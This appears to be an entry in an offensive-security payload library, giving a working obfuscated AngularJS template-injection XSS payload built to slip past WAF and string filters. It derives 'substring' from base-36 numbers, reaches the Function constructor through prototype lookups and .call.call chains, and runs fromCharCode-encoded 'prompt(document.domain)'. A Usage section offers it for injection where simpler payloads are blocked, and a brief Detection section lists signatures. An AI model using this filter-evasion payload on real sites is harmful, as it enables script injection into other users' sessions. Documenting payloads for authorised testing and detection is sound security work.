---
id: 9e088676-355e-4bca-a9d9-01123c0e7a6e
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:43.715530+00:00'
updated_at: '2023-04-10T20:24:52.691430+00:00'
tags:
  - xss
  - angular
  - payload
  - obfuscation
  - waf-bypass
platforms:
  - Web
validated: true
---

# Obfuscated-Angular-Prompt-Domain-fromCharCode

## Code

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

## Description

This obfuscated payload generates a random base-36 string key to indirectly access String.prototype.substring and fromCharCode, constructing and executing 'prompt(document.domain)' to reveal the current origin, evading direct string filters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| (None) | Hardcoded numbers x and y generate the key; char codes for 'prompt(document.domain)'. | N/A |

## Usage

Inject into Angular templates for advanced XSS testing where basic payloads are blocked. Prompts the domain for domain validation in cross-origin attacks.

## Detection

- Anomalous base-36 conversions or getOwnPropertyDescriptor calls in JS execution logs.
- WAF signatures for chained .call.call patterns or prompt invocations.
- Network/behavioral monitoring for unexpected browser prompts.

## Related

- [[procedures/Advanced-XSS-Bypass-in-Angular-and-AngularJS]]
